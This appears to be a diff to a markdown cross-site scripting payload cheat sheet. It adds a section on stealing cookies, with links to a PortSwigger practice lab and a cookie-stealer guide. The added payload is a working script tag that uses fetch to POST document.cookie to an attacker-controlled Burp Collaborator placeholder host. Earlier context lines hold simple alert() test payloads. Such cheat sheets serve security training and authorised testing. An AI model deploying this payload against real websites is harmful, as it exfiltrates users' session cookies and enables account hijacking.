@@ -57,5 +57,17 @@ print("<script>alert('XSS')</script>")
 <div onpointerup="alert(45)">MOVE HERE</div>
 ```
 
+## XSS to Stealth Cookies
+- Practice this payload here [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
+- XSS Cookie Stealer Tool [Steal Cookies with Reflected XSS](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)
+```javascript
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
+```
 # OWASP TOP 10 A7:1017
 [Link](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS))
